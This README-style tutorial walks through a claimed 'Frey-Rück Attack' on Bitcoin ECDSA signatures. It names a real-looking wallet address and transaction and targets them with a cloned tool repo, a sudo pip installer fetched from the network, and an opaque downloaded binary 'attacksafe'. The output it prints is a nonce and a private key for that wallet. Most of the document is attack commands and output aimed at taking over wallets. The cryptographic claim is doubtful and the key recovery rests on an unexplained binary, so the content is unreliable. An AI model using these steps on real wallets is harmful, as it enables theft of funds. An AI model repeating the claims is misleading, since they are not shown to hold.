# Frey-Rück Attack

---

With a critical vulnerability in the Bitcoin blockchain transaction, we can solve the rather difficult discrete logarithm problem to extract the secret key "K" (NONCE) from the vulnerable ECDSA signature in order to ultimately restore the Bitcoin Wallet, since knowing the secret key we can get a private key. To do this, there are several algorithms from the list of popular attacks on Bitcoin, one of which is the “Frey-Rück Attack on Bitcoin”.



---

* Tutorial: https://youtu.be/wqHES7r1qyc
* Tutorial: https://cryptodeep.ru/frey-ruck-attack

---

# Commands:





    git clone https://github.com/demining/CryptoDeepTools.git


    cd CryptoDeepTools/14FreyRuckAttack/

    ls

    wget https://bootstrap.pypa.io/pip/2.7/get-pip.py

    sudo python2 get-pip.py

    pip2 install -r requirements.txt


---


## With a critical vulnerability, we can get the private key to the Bitcoin Wallet:


https://btc.exan.tech/address/16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG

https://btc.exan.tech/tx/a575ef45375f85d6d3c010dae01df1479e2e0c5b870b80ee757fc2522057db72


---



    RawTX = 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000


    python2 breakECDSA.py 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000


---


R = 0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff

S = 0x649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1

Z = 0xb8e936d143c8733bb1ede19146f8725fee1d10bfc19e14452a51cef0cb0014d8


---

# To implement the attack and get the secret key, we will use the software: “ATTACKSAFE SOFTWARE” [ https://attacksafe.ru/software ]


---

    chmod +x attacksafe


---

    ./attacksafe -tool frey_ruck_attack -open RawTX.txt -save SecretKey.txt


---



## We launched this attack from -tool frey_ruck_attack and the result is saved to the file SecretKey.txt


    cat SecretKey.txt


    Deployments ECDSA:

    SecretKey = 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3


    RawTX = 0100000001599b576edb0e0bf62082a30ff974d04080bfadb4dd9154f4e8949ea8da4c15182c0000006a4730440220061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff0220649db1b4fbaaba2d0669f7f7635157b273146b064248d04e76c25d41971d99a1012103f3b587144f038f7fd504eaebb2159ad97c0ca33c3cbaf7f3899849a9e2c9074bffffffff010000000000000000046a02585800000000


---


## We see the inscription "Deployments ECDSA" which means a critical vulnerability in the Bitcoin blockchain transaction

SecretKey value in HEX format, this is our secret key "K" (NONCE):

K=0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3


---


    pip3 install ECPy


    python3 point2gen.py 0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3



    R          =       0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff
    point2gen  =   (0x061e5f5c2bc146cd5070cdef9cd2376a0b2fbbdbbda698858a38190d06caf1ff , 0x92718ef50eb3f5eb155a244e371194fb5086e58f1d174e88cda0a60a2ed899f7)


---


# ALL CORRECT!


K=0xf99718ec8df44d695daa9eedd2b3cbe29d8a14a3fc026baeb279afe47c709de3

## Now knowing the secret key, we can get the private key to the Bitcoin Wallet: 16DCNX182FdnKxsDqNt4k6AMZGb1BHDzgG


The script: calculate.py will calculate the private key using the formula:
Privkey = ((((S * K) - Z) * modinv(R,N)) % N)


---


    python3 calculate.py


---


## PrivKey = 4faa01f7409813181fb5ae8d352796b791cd9df4ba0650df7008f5d9d6be8766



---


---

* Tutorial: https://youtu.be/wqHES7r1qyc
* Tutorial: https://cryptodeep.ru/frey-ruck-attack

---


|  | Donation Address |
| --- | --- |
| ♥ __BTC__ | 1Lw2kh9WzCActXSGHxyypGLkqQZfxDpw8v |
| ♥ __ETH__ | 0xaBd66CF90898517573f19184b3297d651f7b90bf |
